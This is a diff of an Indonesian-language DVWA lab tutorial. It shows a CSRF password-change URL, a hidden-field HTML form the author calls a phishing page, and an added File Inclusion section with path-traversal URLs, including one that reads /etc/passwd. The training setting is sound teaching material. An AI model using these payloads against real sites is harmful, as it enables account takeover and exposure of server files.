@@ -39,14 +39,14 @@ Cross-site request forgery atau Pemalsuan permintaan lintas situs adalah celah k
 ### Security Low
 Mengganti password pengguna menjadi **test** lewat link
 ```sh
-http://<IP>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
+http://<IP_Server>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
 ```
 
 Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). Silahkan Edit dan simpan kode dibawah ini dengan **nama_file.html**
 ```sh
 <html>
     <body>
-        <form action="http://<IP>/DVWA/vulnerabilities/csrf" method="GET">
+        <form action="http://<IP_Server>/DVWA/vulnerabilities/csrf" method="GET">
             <input type="hidden" name="password_new" value="test123" />
             <input type="hidden" name="password_conf" value="test123" />
             <input type="hidden" name="Change" value="Change" />
@@ -60,7 +60,27 @@ Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). S
 
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%204.JPG)
 
-### Security Medium
+## File Inclusion
+File Inclusion Attack adalah jenis celah keamanan web yang memungkinkan penyerang mengakses file sensitif di server atau memungkinkan mereka untuk menjalankan file berbahaya di server mereka.
 
+### Security Low
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file4.php
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%205.JPG)
+
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%206.JPG)
+
+Membuka isi file **/etc/passwd** di server
+```sh
+http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%207.JPG)
 
 Referensi: https://portswigger.net/web-security/learning-path
